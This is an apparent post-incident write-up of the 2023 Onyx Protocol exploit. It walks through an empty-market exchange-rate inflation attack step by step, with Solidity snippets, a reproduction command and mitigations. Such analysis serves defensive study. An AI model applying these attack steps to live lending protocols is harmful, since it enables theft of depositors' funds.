---
title: Onyx Protocol
type: Exploit
network: [ethereum]
date: 2023-11-01
loss_usd: 2100000
returned_usd: 0
tags: [business logic, price manipulation]
subcategory: N/A
vulnerable_contracts:
  - "0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635"
tokens_lost:
  - USDC
  - USDT
  - PAXG
  - DAI
  - WBTC
  - LINK
  - ETH
attacker_addresses:
  - "0x085bdff2c522e8637d4154039db8746bb8642bff"
malicious_token: N/A
attack_block: 18476513
reproduction_command: forge test --match-contract Exploit_Onyx_Protocol -vvv
attack_txs:
  - "0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635"
sources:
  - title: PeckShield Alert
    url: https://x.com/peckshield/status/1719664641109037551
  - title: BlockSec Phalcon
    url: https://x.com/Phalcon_xyz/status/1719697319824851051
---

## Step-by-step Overview

The Onyx Protocol vulnerability centered on manipulating the protocol's exchange rate calculation (exchangeRate = totalSupply / totalShares). An "empty market" condition was created when Proposal 22 was approved to integrate PEPE token into the protocol. Here's how the vulnerability was exploited:

1. Setup (Get Flash Loan)

   - Flash loan 4000 WETH from Aave
   - Swap WETH for PEPE tokens
   - Create attack contract to manipulate market

2. Market Manipulation (Empty Market Attack)

   - Mint small amount of oPEPE (1e18)
   - Redeem almost all oPEPE (leave 2 wei)
   - This creates minimal share tokens while keeping market active

3. Price manipulation

   - Transfer large amount of PEPE to oPEPE market
   - This inflates the exchange rate since supply is minimal
   - Enter markets to enable borrowing

4. Exploit Inflated Collateral

   - Use inflated oPEPE as collateral
   - Borrow nearly all ETH from oETH market
   - Exchange rate manipulation makes this possible

5. Recover donated funds

   - Exploit rounding error to withdraw donated PEPE
   - Calculate exact amount needed for liquidation
   - Redeem underlying PEPE tokens

6. Liquidation
   - Liquidate borrower position with 1 wei ETH
   - This triggers seizing of collateral
   - Mint precise amount of tokens to reset market
   - Redeem remaining collateral
   - Repay flash loan with profits

## Detailed Description

1. Gets 4000 WETH from Aave V3 and swaps it for PEPE tokens to prepare for the attack.

```solidity
    AaveV3.flashLoanSimple(address(this), address(WETH), 4000 * 1e18, bytes(""), 0);
    Router.swapExactTokensForTokens(WETH.balanceOf(address(this)), amountOut, path, address(this), block.timestamp + 3600);
```

2. Creates minimal share tokens while maintaining an active market by minting and immediately redeeming.

```solidity
    oPEPE.mint(1e18);
    oPEPE.redeem(oPEPE.totalSupply() - 2); // Leave 2 wei
```

3. Donate large amount of PEPE to artificially inflate the exchange rate due to minimal supply.

```solidity
    PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));
    address[] memory oTokens = new address[](1);
    oTokens[0] = address(oPEPE);
    Unitroller.enterMarkets(oTokens);
```

4. Uses inflated oPEPE as collateral to borrow almost all ETH from the oETH market.

```solidity
    oETHER.borrow(oETHER.getCash() - 1);
    (bool success,) = msg.sender.call{value: address(this).balance}("");
```

5. Exploits rounding error to withdraw donated PEPE and calculates precise liquidation amounts.

```solidity
    oPEPE.redeemUnderlying(redeemAmt);
    (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
    (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(address(oETHER), address(oPEPE), 1);
```

6. Liquidates position and resets market state through precise token minting.

```solidity
    uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;
    oPEPE.mint(mintAmount);
    // Repeats process for other tokens (USDC, USDT, PAXG, DAI, WBTC, LINK)
    WETH.approve(address(AaveV3), amount + premium);
```

The attack was executed through three main contracts:

Exploit_Onyx_Protocol: Main contract handling flash loan and token swaps
Attacker1Contracts: Handles the initial PEPE token manipulation drain ETH from the Onyx
Attacker2Contracts: Replicates the attack for other tokens (USDC, USDT, PAXG, DAI, WBTC, LINK)

## Possible mitigations

For new markets should consider including and preserving the order of these steps:

1. Set CF to zero
2. List market
3. Mint cTokens
4. Set CF to non-zero.
